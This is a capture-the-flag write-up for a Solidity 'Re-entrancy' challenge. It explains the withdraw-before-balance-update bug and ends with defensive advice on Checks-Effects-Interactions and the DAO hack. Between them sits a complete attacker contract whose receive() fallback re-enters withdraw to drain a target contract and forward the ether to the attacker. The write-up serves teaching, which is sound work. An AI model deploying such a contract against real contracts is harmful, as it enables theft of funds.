# Re-entrancy

## Challenge Statement

The goal of this level is for you to steal all the funds from the contract.

## Analysis

As the name suggests, the contract is vulnerable to a re-entrancy attack. Best explained here: https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html.

re-entrancy: When calling an external address of a contract, e.g transferring ether, control flow is transferred to the receiving contract - an external entity. The external entity can then re-call the initial function in the initial contract, re-entering it and setting up a loop which can keep re-entering.

Here, Line 21 is succeptible: ```(bool result,) = msg.sender.call{value:_amount}("");```. Only after this call does the balance get reduced, and so we can ensure our malicious receiving contract recalls the original contract function and gets sent the same amount without our balance variable reducing, until the contract runs out of ether.



## Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReEnter {

    Reentrance targetContract = Reentrance(0x4F9D07BB32a9e080c9fb700ce293d0fFB6DF593B);
    address payable target = 0x4F9D07BB32a9e080c9fb700ce293d0fFB6DF593B;
    uint256 public targetValue = 1000000000000000; // value of target contract at the start

    function donateWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate{value:msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawToWallet() public returns (bool) {
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value:totalBalance}("");
        require(sent, "failed to send eth");
        return sent;
    }

    receive() external payable { 
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue); // re-entrance
        }
    }
    
}
```


## Moral

In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 
The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.